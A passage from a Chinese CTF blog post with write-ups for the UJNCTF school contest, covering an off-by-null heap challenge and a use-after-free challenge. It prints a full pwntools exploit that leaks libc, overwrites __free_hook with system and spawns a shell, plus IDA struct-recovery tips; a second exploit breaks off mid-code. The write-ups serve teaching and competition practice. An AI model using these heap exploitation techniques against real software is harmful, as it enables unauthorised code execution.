<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="UJNCTFæ ¡èµ›wp"><meta name="keywords" content="wp,pwn,reverse,web,misc"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>UJNCTFæ ¡èµ›wp | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="åˆ‡æ¢æ–‡ç« è¯¦æƒ…">åˆ‡æ¢ç«™ç‚¹æ¦‚è§ˆ</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wp-by-lemon"><span class="toc-number">1.</span> <span class="toc-text">wp by lemon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number">1.1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.1.1.</span> <span class="toc-text">null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WriteMaster"><span class="toc-number">1.1.2.</span> <span class="toc-text">WriteMaster</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E6%83%B3%E5%88%86%E4%BA%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E7%89%87"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">æ­£ç‰‡</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">å®Œæ•´exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0ub%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">ä¼ªé€ ubè¯¦è§£</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#caculator"><span class="toc-number">1.1.3.</span> <span class="toc-text">caculator</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">è¯¦è§£</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bbbbbbaaaaaasssssseeeeee"><span class="toc-number">1.2.1.</span> <span class="toc-text">bbbbbbaaaaaasssssseeeeee</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zzzzzziiiiiipppppp"><span class="toc-number">1.2.2.</span> <span class="toc-text">zzzzzziiiiiipppppp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WaterMark"><span class="toc-number">1.2.3.</span> <span class="toc-text">WaterMark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#letter"><span class="toc-number">1.2.4.</span> <span class="toc-text">letter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#emoji-master"><span class="toc-number">1.2.5.</span> <span class="toc-text">emoji-master</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">å‡ºé¢˜äººè§†è§’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">è§£é¢˜äººè§†è§’</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">1.3.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dragon"><span class="toc-number">1.3.1.</span> <span class="toc-text">dragon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#equation"><span class="toc-number">1.3.2.</span> <span class="toc-text">equation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flattening"><span class="toc-number">1.3.3.</span> <span class="toc-text">flattening</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92-1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">å‡ºé¢˜äººè§†è§’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E4%BA%BA%E8%A7%86%E8%A7%92-1"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">è§£é¢˜äººè§†è§’</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wp-by-Sparta-EN"><span class="toc-number">2.</span> <span class="toc-text">wp by Sparta_EN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">ç­¾åˆ°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-PHP"><span class="toc-number">2.2.1.</span> <span class="toc-text">Simple PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expresssssss"><span class="toc-number">2.2.2.</span> <span class="toc-text">Expresssssss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Happy-PHP"><span class="toc-number">2.2.3.</span> <span class="toc-text">Happy PHP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Crypto"><span class="toc-number">2.3.1.</span> <span class="toc-text">EZ Crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-RSA"><span class="toc-number">2.3.2.</span> <span class="toc-text">Baby RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%A4%A7E%E4%BA%86"><span class="toc-number">2.3.3.</span> <span class="toc-text">æˆ‘å¤§Eäº†</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Traffic"><span class="toc-number">2.4.1.</span> <span class="toc-text">EZ Traffic</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">57</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">54</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">åˆ†ç±»</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">é­”æ³•å°‘å¥³é›ªæ®‡</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">æ–‡ç« </a><a class="site-page" href="/tags">æ ‡ç­¾</a><a class="site-page" href="/categories">åˆ†ç±»</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">UJNCTFæ ¡èµ›wp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-11</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="wp-by-lemon"><a href="#wp-by-lemon" class="headerlink" title="wp by lemon"></a>wp by lemon</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="null"><a href="#null" class="headerlink" title="null"></a>null</h3><p>ç­¾åˆ°é¢˜ï¼Œå› ä¸ºæ˜¯å‡ºé¢˜äººæ‰€ä»¥è¿˜æ˜¯å†™ä¸‹wp QAQ</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzom7s7kkj61h80lagp802.jpg" alt=""></p>
<p>editå‡½æ•°ä¸­è°ƒç”¨äº†sub_994ï¼Œç‚¹è¿›å»è§‚å¯Ÿå‡½æ•°</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzon020cfj616u0h8diw02.jpg" alt=""></p>
<p>è¿™ä¸ªå‡½æ•°æœ¬è´¨ä¸Šæ˜¯æƒ³å¦‚æœè¾“å…¥å›è½¦åå¡«å……00å­—èŠ‚æ¥ä»£æ›¿å›è½¦çš„â€™\x0aâ€™ï¼Œä½†æ˜¯å¿½ç•¥äº†å¡«å……å®Œå…¨çš„æƒ…å†µï¼Œå¯¼è‡´off-by-nullæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚</p>
<p>æ€è·¯ï¼šç”³è¯·ä¸€ç³»åˆ—å †å—ï¼Œé‡ç‚¹æœ‰ä¿©å †å—ï¼Œä¸€ä¸ªå †å—æ˜¯è¢«æº¢å‡ºçš„å †å—è®°ä¸ºvictimï¼Œå…¶sizeè¦æ»¡è¶³0x?f0çš„æ¡ä»¶ï¼Œå› ä¸ºåœ¨headerä¸­å¡«å……åå…¶sizeçš„ä½å­—èŠ‚ä¸º01ï¼Œoffbynullæº¢å‡ºåå…¶ä½å­—èŠ‚ä¸º00ï¼Œå¯ä»¥å‘å‰malloc_consolidateï¼›ä¸€ä¸ªå †å—æ˜¯victimçš„prev_sizeç´¢å¼•åˆ°çš„å †å—ï¼Œè¿™ä¸ªå †å—è¦æ»¡è¶³unsorted binå¤§å°ï¼Œå› ä¸ºåœ¨å‘å‰åˆå¹¶çš„è¿‡ç¨‹ä¸­ä¼šunlinkï¼Œä¼šæ£€æŸ¥fdå’Œbkçš„åˆæ³•æ€§ï¼Œåˆ©ç”¨unsorted binçš„ç‰¹æ€§è®©ç³»ç»Ÿå¸®æˆ‘ä»¬â€ä¼ªé€ â€œfdå’ŒbkæŒ‡é’ˆã€‚</p>
<p>ç„¶åæœ‰äº†overlapå²‚ä¸æ˜¯éšä¾¿ç©å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./null&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.27/lib/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./null&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;choide:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x560</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">1482</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;5&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(__free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(system)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h3 id="WriteMaster"><a href="#WriteMaster" class="headerlink" title="WriteMaster"></a>WriteMaster</h3><h4 id="æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§"><a href="#æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§" class="headerlink" title="æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§"></a>æˆ‘æƒ³åˆ†äº«çš„ä¸€äº›åˆ†ææŠ€å·§</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy318nhvj61br0u0q9m02.jpg" alt=""></p>
<p>åœ¨addå‡½æ•°ä¸­ç¬¬ä¸€çœ¼çœ‹è¿‡å»å¾ˆä¹±ï¼ŒçŒœæµ‹ç”³è¯·äº†å¾ˆå¤šç»“æ„ä½“ä»€ä¹ˆçš„ï¼Œè¿™ä¸ªæ—¶å€™æœ‰ç»éªŒçš„å¸ˆå‚…ç¡¬çœ‹å¾ˆå¥½åˆ†æï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬æ¥è¯´è¦å­¦ä¼šå·é¸¡ï¼Œè¿è¡Œä¸€ä¸‹ç¨‹åºçœ‹çœ‹åˆ°åº•æ˜¯å¹²å•¥çš„</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy5etqpsj610g0nmgn102.jpg" alt=""></p>
<p>çœ‹åˆ°å…ˆåè¾“å…¥äº†indexï¼ˆåœ¨çº¢æ¡†æ¡†çš„ä¸Šé¢ï¼Œæ‡’å¾—é‡æ–°æˆªå›¾äº†ï¼‰ï¼Œheader sizeï¼Œheaderï¼Œtext sizeå’Œtextï¼Œç„¶åæ‰¾æ‰¾addå‡½æ•°ä¸­çš„ä¸€å †exitä¿¡æ¯ä¸­éƒ½è¾“å‡ºäº†å­—ç¬¦ä¸²ï¼Œidaä¸­çœ‹çœ‹</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy8nhz28j61e60ngq9z02.jpg" alt=""></p>
<p>ç»“åˆé¢˜ç›®åå­—å¤§æ¦‚èƒ½å¤ŸçŒœå‡ºæ¥æ˜¯ä¸€ä¸ªæ–‡ç« ç®¡ç†çš„ä¸œè¥¿ï¼Œèƒ½å¤Ÿå†™æ ‡é¢˜ï¼Œå†™æ–‡ç« æ­£æ–‡ï¼Œåæ­£ä¸šåŠ¡å°±æ˜¯è¿™ä¹ˆä¸ªä¸šåŠ¡ï¼Œé€»è¾‘å°±æ˜¯è¿™ä¹ˆä¸ªé€»è¾‘ï¼Œå®åœ¨ä¸è¡Œgdbä¸€é¡¿åŠ¨è°ƒä¹Ÿèƒ½å‘ç°å„ä¸ªchunkä¹‹é—´çš„è¡”æ¥å…³ç³»ã€‚</p>
<p>æ‰€ä»¥å…ˆéšä¾¿å†™ä¸ªç»“æ„ä½“çœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Article</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* header;</span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyn5t16rj60uh0u00yh02.jpg" alt=""></p>
<p>åœ¨idaä¸­æ‰¾åˆ°local types</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyook15qj61cs0p877b02.jpg" alt=""></p>
<p>å¯¼å…¥ç»“æ„ä½“ï¼Œç„¶åæ›´æ”¹bssä¸­çš„å˜é‡202040çš„ç±»å‹ä¸ºarticle</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyq5cnj5j61om0n2gsj02.jpg" alt=""></p>
<p>çœ‹èµ·æ¥ä»ç„¶ä¸å¤ªå¯¹çš„æ ·å­ï¼Œæ³¨æ„åˆ°æœ‰äºŒçº§æŒ‡é’ˆçš„å­˜åœ¨ï¼ŒçŒœæµ‹æ–‡ç« å¤´æˆ–è€…æ–‡ç« æ­£æ–‡çš„åœ°æ–¹è¿˜æœ‰ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Text</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>åˆ†åˆ«å¯¼å…¥åï¼ŒæŒ¨è¾¹è¯•ä¸‹ï¼Œæœ€ç»ˆå¯ä»¥ä¼˜åŒ–æˆå¦‚ä¸‹æ ·å­</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzz0q208oj61je0lkgrb02.jpg" alt=""></p>
<p>æ€»ä¹‹ä¼šæ¯”å—¯å®¡å¥½ç‚¹</p>
<h4 id="æ­£ç‰‡"><a href="#æ­£ç‰‡" class="headerlink" title="æ­£ç‰‡"></a>æ­£ç‰‡</h4><h5 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h5><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv18ihld8cj60si0hs76t02.jpg" alt=""></p>
<p>æ˜æ˜¾çš„UAFæ¼æ´</p>
<p>åªèƒ½ç”³è¯·å°äº0x60çš„chunkï¼Œè¾“å…¥666æœ‰ä¸ªåé—¨å¯ä»¥editä¸¤æ¬¡ï¼Œå¦‚æœä¸æ˜¯é™åˆ¶äº†chunkçš„å¤§å°å°±æ˜¯ç™½ç»™é¢˜</p>
<p>å› ä¸ºæ˜¯uafï¼Œæ‹¿åˆ°å †åœ°å€è½»è½»æ¾æ¾ï¼Œé€šè¿‡uafçš„å¸ƒå±€ä¼ªé€ å‡ºubï¼Œç„¶åæ³„éœ²å‡ºå †åœ°å€å’Œlibcçš„åœ°å€ï¼Œæœ€ååŠ«æŒfreehookæ¥getshellï¼Œå®Œæ•´expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./WriterMaster&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span 